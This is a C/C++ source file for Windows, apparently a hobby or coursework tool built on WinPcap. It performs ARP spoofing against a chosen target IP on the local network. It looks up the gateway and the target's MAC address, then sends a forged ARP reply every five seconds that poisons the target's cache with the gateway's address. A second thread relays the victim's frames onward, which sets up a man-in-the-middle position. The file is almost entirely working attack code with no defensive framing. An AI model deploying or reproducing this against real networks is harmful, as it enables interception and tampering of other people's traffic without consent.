#include <winsock2.h>
#include <ws2ipdef.h>
#include <iphlpapi.h>
#include <stdlib.h>
#include <string.h>
#include <thread>

#include "pcap.h"

#pragma comment(lib, "IPHLPAPI.lib")
#pragma comment(lib, "ws2_32.lib")

#define MALLOC(x) HeapAlloc(GetProcessHeap(), 0, (x))
#define FREE(x) HeapFree(GetProcessHeap(), 0, (x))


#define  WPCAP
#define  HAVE_REMOTE
#define ETHERNET 0x0001
#define IP_PROTOCOL 0x0800
#define ARP_REQUEST 0x0001
#define ARP_REPLY 0x0002
#define PCAP_OPENFLAG_PROMISCUOUS 1
#define ETH_HDRLEN 14      // Ethernet header length
#define IP4_HDRLEN 20      // IPv4 header length
#define ARP_HDRLEN 28      // ARP header length
#define ARP_PROTOCOL 0x0806

typedef struct data {
	pcap_t *adhandle;

	u_int myMAC[6] = { 0, };
	u_int myIP[4] = { 0, };
	u_int gatewayMAC[6] = { 0, };
	u_int gatewayIP[4] = { 0, };
	u_int targetMAC[6] = { 0, };
	u_int targetIP[4] = { 0, };
};

/* Ethernet header*/
typedef struct eth_header
{
	u_int8_t dmac[6];
	u_int8_t smac[6];
	u_int16_t prot;
}eth_header;

/* 4 bytes IP address */
typedef struct ip_address
{
	u_int8_t byte1;
	u_int8_t byte2;
	u_int8_t byte3;
	u_int8_t byte4;
}ip_address;

typedef struct arp_header
{
	u_int16_t hardware;
	u_int16_t protocol;
	u_int8_t hard_size = 0x06;
	u_int8_t proto_size = 0x04;
	u_int16_t opcode;
	u_int8_t smac[6];
	ip_address saddr;
	u_int8_t tmac[6];
	ip_address taddr;
}arp_header;


int get_gateway_mac(char *gateway_ip, data *dataparam)
{
	data *info = (data *)dataparam;
	// Declare and initialize variables
	int i;
	unsigned int j;
	unsigned long status = 0;

	PMIB_IPNET_TABLE2 pipTable = NULL;
	//    MIB_IPNET_ROW2 ipRow;

	status = GetIpNetTable2(AF_INET, &pipTable);
	if (status != NO_ERROR) {
		printf("GetIpNetTable for IPv4 table returned error: %ld\n", status);
		exit(1);
	}

	for (i = 0; (unsigned)i < pipTable->NumEntries; i++) {
		//        printf("Table entry: %d\n", i);
		if (strcmp(inet_ntoa(pipTable->Table[i].Address.Ipv4.sin_addr), gateway_ip) == 0) {

			for (j = 0; j < pipTable->Table[i].PhysicalAddressLength; j++) {
				info->gatewayMAC[j] = (int)pipTable->Table[i].PhysicalAddress[j];
			}
		}
	}
	FreeMibTable(pipTable);
	pipTable = NULL;

	return 0;
}

int get_base_info(char *device_name, data *dataparam)
{
	data *info = (data*)dataparam;
	PIP_ADAPTER_INFO pAdapterInfo;
	PIP_ADAPTER_INFO pAdapter = NULL;
	DWORD dwRetVal = 0;
	UINT i;
	char* temp;
	char* remain = NULL;

	struct tm newtime;
	char buffer[32];
	errno_t error;

	ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
	pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(sizeof(IP_ADAPTER_INFO));
	if (pAdapterInfo == NULL) {
		printf("Error allocating memory needed to call GetAdaptersinfo\n");
		return 1;
	}
	// Make an initial call to GetAdaptersInfo to get
	// the necessary size into the ulOutBufLen variable
	if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW) {
		FREE(pAdapterInfo);
		pAdapterInfo = (IP_ADAPTER_INFO *)MALLOC(ulOutBufLen);
		if (pAdapterInfo == NULL) {
			printf("Error allocating memory needed to call GetAdaptersinfo\n");
			return 1;
		}
	}

	if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR) {
		pAdapter = pAdapterInfo;
		while (pAdapter) {
			if (strstr(pAdapter->AdapterName, device_name)) {
				/*get My MAC*/
				for (i = 0; i < pAdapter->AddressLength; i++)
					info->myMAC[i] = (int)pAdapter->Address[i];

				/* get My IP */
				temp = pAdapter->IpAddressList.IpAddress.String;
				info->myIP[0] = atoi(strtok_s(temp, ".", &remain));
				for (i = 1; i < 4; i++)
					info->myIP[i] = atoi(strtok_s(NULL, ".", &remain));

				/* get Gateway IP & MAC */
				remain = NULL;
				temp = pAdapter->GatewayList.IpAddress.String;
				get_gateway_mac(temp, dataparam);
				info->gatewayIP[0] = atoi(strtok_s(temp, ".", &remain));
				for (i = 1; i < 4; i++)
					info->gatewayIP[i] = atoi(strtok_s(NULL, ".", &remain));
			}
			pAdapter = pAdapter->Next;
		}
	}
	else {
		printf("GetAdaptersInfo failed with error: %d\n", dwRetVal);

	}
	if (pAdapterInfo)
		FREE(pAdapterInfo);

	return 0;
}

int get_target_mac(data *dataparam)
{
	data *info = (data*)dataparam;
	u_int8_t packet[60] = { 0, };
	eth_header eth_head;
	arp_header arp_head;
	arp_header *get_arp_head;
	eth_header *get_eth_head;

	int res;
	struct pcap_pkthdr *header;
	const u_char *pkt_data;

	/* Supposing to be on ethernet, set mac destination */
	eth_head.dmac[0] = 0xff;
	eth_head.dmac[1] = 0xff;
	eth_head.dmac[2] = 0xff;
	eth_head.dmac[3] = 0xff;
	eth_head.dmac[4] = 0xff;
	eth_head.dmac[5] = 0xff;

	/* set mac source */
	eth_head.smac[0] = info->myMAC[0];
	eth_head.smac[1] = info->myMAC[1];
	eth_head.smac[2] = info->myMAC[2];
	eth_head.smac[3] = info->myMAC[3];
	eth_head.smac[4] = info->myMAC[4];
	eth_head.smac[5] = info->myMAC[5];

	/* set protocol to arp*/
	eth_head.prot = htons(ARP_PROTOCOL);

	/* Set arp packet */
	arp_head.hardware = htons(ETHERNET);
	arp_head.protocol = htons(IP_PROTOCOL);
	arp_head.opcode = htons(ARP_REQUEST);

	/* set mac sender */
	arp_head.smac[0] = info->myMAC[0];	arp_head.smac[1] = info->myMAC[1];
	arp_head.smac[2] = info->myMAC[2];	arp_head.smac[3] = info->myMAC[3];
	arp_head.smac[4] = info->myMAC[4];	arp_head.smac[5] = info->myMAC[5];

	/* set sender ip */
	arp_head.saddr.byte1 = info->myIP[0];	arp_head.saddr.byte2 = info->myIP[1];
	arp_head.saddr.byte3 = info->myIP[2];	arp_head.saddr.byte4 = info->myIP[3];

	/* set mac target */
	arp_head.tmac[0] = 0;	arp_head.tmac[1] = 0;
	arp_head.tmac[2] = 0;	arp_head.tmac[3] = 0;
	arp_head.tmac[4] = 0;	arp_head.tmac[5] = 0;

	/* set target ip */
	arp_head.taddr.byte1 = info->targetIP[0];
	arp_head.taddr.byte2 = info->targetIP[1];
	arp_head.taddr.byte3 = info->targetIP[2];
	arp_head.taddr.byte4 = info->targetIP[3];

	/* Create packet using header */
	memcpy(packet, &eth_head, sizeof(eth_header));
	memcpy(packet + ETH_HDRLEN, &arp_head, sizeof(arp_header));

	if (pcap_sendpacket(info->adhandle,	// Adapter
		packet,				// buffer with the packet
		sizeof(packet)		// size
		) != 0)
	{
		printf("\nError sending the packet: %s\n", pcap_geterr(info->adhandle));
		return 3;
	}
	else printf("Request Send\n");


	printf("Getting target MAC\n");

	while ((res = pcap_next_ex(info->adhandle, &header, &pkt_data)) >= 0) {
		printf(".");
		if (res == 0)
			/* Timeout elapsed */
			continue;

		get_eth_head = (eth_header *)(pkt_data);
		get_arp_head = (arp_header *)(pkt_data + ETH_HDRLEN);

		if (get_eth_head->prot == htons(ARP_PROTOCOL) &&
			get_arp_head->saddr.byte1 == info->targetIP[0] &&
			get_arp_head->saddr.byte2 == info->targetIP[1] &&
			get_arp_head->saddr.byte3 == info->targetIP[2] &&
			get_arp_head->saddr.byte4 == info->targetIP[3])
		{
			printf("\n%d.%d.%d.%d\n", get_arp_head->taddr.byte1, get_arp_head->taddr.byte2,
				get_arp_head->taddr.byte2, get_arp_head->taddr.byte3);
		
			info->targetMAC[0] = get_arp_head->smac[0];			info->targetMAC[1] = get_arp_head->smac[1];
			info->targetMAC[2] = get_arp_head->smac[2];			info->targetMAC[3] = get_arp_head->smac[3];
			info->targetMAC[4] = get_arp_head->smac[4];			info->targetMAC[5] = get_arp_head->smac[5];

			printf("%x-%x-%x-%x-%x-%x\n", get_arp_head->smac[0]
				, get_arp_head->smac[1]
				, get_arp_head->smac[2]
				, get_arp_head->smac[3]
				, get_arp_head->smac[4]
				, get_arp_head->smac[5]);

			printf("Get Target MAC\n");
			return 0;
		}

	}

}

DWORD WINAPI send_arp_spoof(LPVOID param)
{
	data *info = (data*)param;
	u_int8_t packet[60] = { 0, };
	int i = 0;
	eth_header eth_head;
	arp_header arp_head;

	/* Supposing to be on ethernet, set mac destination */
	eth_head.dmac[0] = info->targetMAC[0];	eth_head.dmac[1] = info->targetMAC[1];
	eth_head.dmac[2] = info->targetMAC[2];	eth_head.dmac[3] = info->targetMAC[3];
	eth_head.dmac[4] = info->targetMAC[4];	eth_head.dmac[5] = info->targetMAC[5];

	/* set mac source */
	eth_head.smac[0] = info->myMAC[0];	eth_head.smac[1] = info->myMAC[1];
	eth_head.smac[2] = info->myMAC[2];	eth_head.smac[3] = info->myMAC[3];
	eth_head.smac[4] = info->myMAC[4];	eth_head.smac[5] = info->myMAC[5];

	/* set protocol to arp*/
	eth_head.prot = htons(ARP_PROTOCOL);

	/* Set arp packet */
	arp_head.hardware = htons(ETHERNET);
	arp_head.protocol = htons(IP_PROTOCOL);
	arp_head.opcode = htons(ARP_REPLY);

	/* set mac sender */
	arp_head.smac[0] = info->myMAC[0];	arp_head.smac[1] = info->myMAC[1];
	arp_head.smac[2] = info->myMAC[2];	arp_head.smac[3] = info->myMAC[3];
	arp_head.smac[4] = info->myMAC[4];	arp_head.smac[5] = info->myMAC[5];

	/* set sender ip */
	arp_head.saddr.byte1 = info->gatewayIP[0];	arp_head.saddr.byte2 = info->gatewayIP[1];
	arp_head.saddr.byte3 = info->gatewayIP[2];	arp_head.saddr.byte4 = info->gatewayIP[3];

	/* set mac target */
	arp_head.tmac[0] = info->targetMAC[0];	arp_head.tmac[1] = info->targetMAC[1];
	arp_head.tmac[2] = info->targetMAC[2];	arp_head.tmac[3] = info->targetMAC[3];
	arp_head.tmac[4] = info->targetMAC[4];	arp_head.tmac[5] = info->targetMAC[5];

	/* set target ip */
	arp_head.taddr.byte1 = info->targetIP[0];
	arp_head.taddr.byte2 = info->targetIP[1];
	arp_head.taddr.byte3 = info->targetIP[2];
	arp_head.taddr.byte4 = info->targetIP[3];

	/* Create packet using header */
	memcpy(packet, &eth_head, sizeof(eth_header));
	memcpy(packet + ETH_HDRLEN, &arp_head, sizeof(arp_header));

	/* Send down the packet */
	while (1) {
		if (pcap_sendpacket(info->adhandle,	// Adapter
			packet,				// buffer with the packet
			sizeof(packet)		// size
			) != 0)
		{
			printf("\nError sending the packet: %s\n", pcap_geterr(info->adhandle));
			return 3;
		}
		else printf("\nArp Spoof Send\n");
		Sleep(5000);
	}

}

DWORD WINAPI packet_relay(LPVOID param)
{
	data *info = (data*)param;
	eth_header *get_eth_head;

	int res;
	struct pcap_pkthdr *header;
	const u_char *pkt_data;
	u_char packet[65536] = { 0 };

	while ((res = pcap_next_ex(info->adhandle, &header, &pkt_data)) >= 0) {
		printf(".");
		if (res == 0)
			/* Timeout elapsed */
			continue;

		get_eth_head = (eth_header *)(pkt_data);

		if (get_eth_head->smac[0] == info->targetMAC[0] &&
			get_eth_head->smac[1] == info->targetMAC[1] &&
			get_eth_head->smac[2] == info->targetMAC[2] &&
			get_eth_head->smac[3] == info->targetMAC[3] &&
			get_eth_head->smac[4] == info->targetMAC[4] &&
			get_eth_head->smac[5] == info->targetMAC[5])
		{
			get_eth_head->smac[0] = info->myMAC[0];
			get_eth_head->smac[1] = info->myMAC[1];
			get_eth_head->smac[2] = info->myMAC[2];
			get_eth_head->smac[3] = info->myMAC[3];
			get_eth_head->smac[4] = info->myMAC[4];
			get_eth_head->smac[5] = info->myMAC[5];

			get_eth_head->dmac[0] = info->gatewayMAC[0];
			get_eth_head->dmac[1] = info->gatewayMAC[1];
			get_eth_head->dmac[2] = info->gatewayMAC[2];
			get_eth_head->dmac[3] = info->gatewayMAC[3];
			get_eth_head->dmac[4] = info->gatewayMAC[4];
			get_eth_head->dmac[5] = info->gatewayMAC[5];

			memcpy(packet, pkt_data, header->caplen);
			memcpy(packet, (u_char*)get_eth_head, ETH_HDRLEN);

			if (pcap_sendpacket(info->adhandle,	// Adapter
				packet,				// buffer with the packet
				header->caplen		// size
				) != 0)
			{
				printf("\nError sending the packet: %s\n", pcap_geterr(info->adhandle));
				return 3;
			}
			else printf("\nPacket Relay\n");

		}
	}
}

int main(int argc, char **argv)
{
	data dataparam;
	pcap_if_t *alldevs;
	pcap_if_t *d;
	int inum;
	char device_id[39] = { 0, };
	char errbuf[PCAP_ERRBUF_SIZE];
	int i = 0;

	HANDLE thread[2];
	DWORD thread_id1, thread_id2;

	/* Retrieve the device list on the local machine */
	if (pcap_findalldevs_ex(PCAP_SRC_IF_STRING, NULL, &alldevs, errbuf) == -1)
	{
		fprintf(stderr, "Error in pcap_findalldevs: %s\n", errbuf);
		exit(1);
	}

	/* Print the list */
	for (d = alldevs; d; d = d->next)
	{
		printf("%d. %s", ++i, d->name);
		if (d->description)
			printf(" (%s)\n", d->description);
		else
			printf(" (No description available)\n");
	}

	if (i == 0)
	{
		printf("\nNo interfaces found! Make sure WinPcap is installed.\n");
		return -1;
	}

	printf("Enter the interface number (1-%d):", i);
	scanf_s("%d", &inum);

	if (inum < 1 || inum > i)
	{
		printf("\nInterface number out of range.\n");

		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	/* Jump to the selected adapter */
	for (d = alldevs, i = 0; i< inum - 1;d = d->next, i++);

	/* Open the device */
	if ((dataparam.adhandle = pcap_open(d->name,
		65536 /*snaplen*/,
		PCAP_OPENFLAG_PROMISCUOUS /*flags*/,
		20 /*read timeout*/,
		NULL /* remote authentication */,
		errbuf)
		) == NULL)
	{
		fprintf(stderr, "\nUnable to open the adapter. %s is not supported by WinPcap\n", d->name);
		/* Free the device list */
		pcap_freealldevs(alldevs);
		return -1;
	}

	memcpy(device_id, d->name + 20, sizeof(device_id));

	get_base_info(device_id, &dataparam);

	printf("Enter Target IP : ");
	scanf_s("%d.%d.%d.%d", &dataparam.targetIP[0], &dataparam.targetIP[1], &dataparam.targetIP[2], &dataparam.targetIP[3]);

	get_target_mac(&dataparam);

	thread[0] = CreateThread(
		NULL,
		0,
		send_arp_spoof,
		(void*)&dataparam,
		CREATE_SUSPENDED,
		&thread_id1
		);

	thread[1] = CreateThread(
		NULL,
		0,
		packet_relay,
		(void*)&dataparam,
		CREATE_SUSPENDED,
		&thread_id1
		);

	ResumeThread(thread[0]);
	ResumeThread(thread[1]);

	WaitForMultipleObjects(2, thread, TRUE, INFINITE);

	pcap_freealldevs(alldevs);

	pcap_close(dataparam.adhandle);

	scanf_s(NULL, NULL, NULL);
	return 0;
}

